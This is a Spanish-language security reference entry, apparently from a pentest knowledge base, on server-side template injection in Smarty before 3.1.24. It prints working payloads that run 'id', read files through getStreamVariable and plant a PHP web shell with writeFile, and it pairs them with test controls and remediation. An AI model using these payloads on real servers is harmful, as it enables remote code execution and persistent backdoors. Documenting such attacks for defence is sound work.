---
clase: inyeccion
tech: smarty
cwe: CWE-1336
cvss: 9.8 # [derivado] escape de sandbox hasta escritura de backdoor. Corregido en Smarty 3.1.24
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea.
  #
  # ---- SMARTY SIN SANDBOX (trivial) ----
  # LITERAL de la fuente (la fuente lo envuelve en delimitadores de code-span dobles):
  {php}echo `id`;{/php}
  #
  # ---- SMARTY EN MODO SEGURO (secure mode): el escape ----
  # Cita de la fuente sobre lo que el sandbox pretende: lista blanca de funciones PHP
  # 'so templates can't directly invoke system()'.
  #
  # PASO 1 - LECTURA de ficheros, esquivando la lista blanca. LITERAL:
  {self::getStreamVariable("file:///proc/self/loginuid")}
  # Salida LITERAL: 1000
  #
  # PASO 2 - leer el PROPIO script para descubrir rutas. LITERAL:
  {self::getStreamVariable($SCRIPT_NAME)}
  # Salida que muestra la fuente (el '...' es su propio truncamiento):
  #   <?php   define("SMARTY_DIR",'/usr/share/php/Smarty/');   require_once(SMARTY_DIR.'Smarty.class.php');   ...
  #
  # PASO 3 - ESCRITURA de un backdoor. LITERAL de la fuente:
  {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
  #
  # LA PIEZA INGENIOSA: writeFile exige un tercer argumento con tipo declarado.
  # Firma LITERAL: public function writeFile($_filepath, $_contents, Smarty $smarty)
  # El tercer parametro debe ser un objeto Smarty. El atacante lo consigue llamando a
  # clearConfig(), cuyo valor de retorno ES una instancia Smarty. Codigo LITERAL:
  #   /**   * Deassigns a single or all config variables   *   * @param  string $varname variable name or null   *   * @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining   */   public function clearConfig($varname = null)   {       return Smarty_Internal_Extension_Config::clearConfig($this, $varname);   }
precondicion: "SSTI confirmada en Smarty. Para el primer payload, que el modo seguro NO este activo. Para el escape, Smarty anterior a 3.1.24 (la fuente indica 'Fixed in 3.1.24'). El paso 3 requiere permisos de escritura sobre la ruta del script, que se descubre con el paso 2."
como_se_descubre: |
  Cadena de tres pasos donde cada uno habilita el siguiente, y el orden importa:
  1. Probar {php}...{/php}. Si funciona, no hay sandbox y se acabo.
  2. Si hay sandbox, buscar en la API de Smarty metodos ESTATICOS accesibles desde
     'self::'. getStreamVariable lee ficheros y NO esta en la lista blanca de funciones
     PHP, porque la lista blanca cubre funciones de PHP, no metodos de Smarty.
  3. Leer el propio script ($SCRIPT_NAME) para conocer rutas reales antes de escribir.
  El paso 2 es la leccion: el sandbox filtra lo que considera peligroso — funciones de
  PHP — y deja intacta la superficie de su PROPIA API, que incluye lectura y escritura
  de ficheros. El sandbox no fue superado: fue rodeado.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: {self::getStreamVariable("file:///proc/self/loginuid")} -> devuelve un UID
  # B: {self::getStreamVariable("file:///ruta/inexistente")}   -> error o vacio DISTINTO
  # El par A/B confirma que se esta LEYENDO el sistema de ficheros y no recibiendo una
  # cadena fija. Si A y B dan lo mismo, el metodo no es alcanzable.
  # C: {php}echo 1;{/php} -> si funciona, no hace falta el escape: el sandbox no esta
  #    activo y el hallazgo se clasifica distinto (y mas simple).
  # El control C evita construir una cadena de tres pasos cuando una basta.
mata: |
  - Smarty 3.1.24 o posterior -> el escape esta corregido.
  - Modo seguro con una politica que restrinja los metodos estaticos accesibles.
  - Sin permisos de escritura en la ruta del script -> el paso 3 falla (quedan 1 y 2).
  - A y B indistinguibles -> getStreamVariable no es alcanzable.
fuente: "https://portswigger.net/research/server-side-template-injection (James Kettle, 2015-08-05, act. 2025-09-03). Payloads, firma de writeFile y codigo de clearConfig literales. Estado segun la fuente: 'Fixed in 3.1.24'. Sin CVE ni recompensa indicados."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] SSTI en Smarty — rodear el sandbox usando la API de Smarty, no PHP

## Principio
El modo seguro de Smarty aplica una lista blanca de funciones **de PHP**, para que las
plantillas no puedan invocar `system()`. La lista blanca cubre PHP. No cubre **la propia
API de Smarty**, que incluye métodos estáticos para leer y escribir ficheros.

El sandbox no se supera: se rodea. Y esa distinción es el valor del caso, porque explica
por qué los sandboxes a nivel de parser fallan sistemáticamente — protegen el lenguaje
anfitrión y olvidan su propia superficie.

## Payload
Sin sandbox, trivial:

```
{php}echo `id`;{/php}
```

Con modo seguro, la cadena de tres pasos.

**Paso 1 — lectura**, usando un método de Smarty que la lista blanca de PHP no contempla:

```
{self::getStreamVariable("file:///proc/self/loginuid")}
```
→ `1000`

**Paso 2 — leer el propio script** para descubrir rutas reales:

```
{self::getStreamVariable($SCRIPT_NAME)}
```
→ `<?php   define("SMARTY_DIR",'/usr/share/php/Smarty/');   require_once(SMARTY_DIR.'Smarty.class.php');   ...`

**Paso 3 — escribir un backdoor:**

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## La pieza más ingeniosa de todo el paper
`writeFile` exige un tercer argumento **con tipo declarado**:

```php
public function writeFile($_filepath, $_contents, Smarty $smarty)
```

Hace falta un objeto `Smarty`, y desde una plantilla no hay forma obvia de construir uno.
La solución es llamar a un método cuyo **valor de retorno** sea una instancia Smarty — y
`clearConfig()` lo es, como documenta su propio comentario:

```php
/**   * Deassigns a single or all config variables   *   * @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining   */   public function clearConfig($varname = null)
```

El método existe para permitir encadenamiento fluido (`$smarty->clearConfig()->...`), una
comodidad de API. Y esa comodidad es lo que satisface el tipo requerido por `writeFile`.

Merece detenerse ahí: la pieza que completa el exploit es una **decisión de diseño de
usabilidad**, no un fallo. Es el patrón que recorre todo el material de SSTI — la
superficie de ataque de un motor de plantillas es su API completa, incluidas las partes
que existen por conveniencia.

## El control que evita trabajo innecesario
Probar `{php}echo 1;{/php}` **primero**. Si funciona, el sandbox no está activo y no hace
falta construir la cadena de tres pasos: el hallazgo es más simple y se clasifica
distinto. Una petición decide si hay que hacer el trabajo largo.

## Impacto
Escritura de un backdoor PHP en la ruta del propio script, es decir ejecución remota de
código persistente. Estado según la fuente: corregido en **Smarty 3.1.24**.

## Remediación
Del paper, y este caso es su mejor argumento: los sandboxes a nivel de parser son
propensos a error y no deben ser la única defensa. La corrección real es no construir
plantillas a partir de datos no confiables, y ejecutar el entorno de plantillas en un
contenedor restringido —con sistema de ficheros de solo lectura, que habría cortado el
paso 3 de esta cadena.
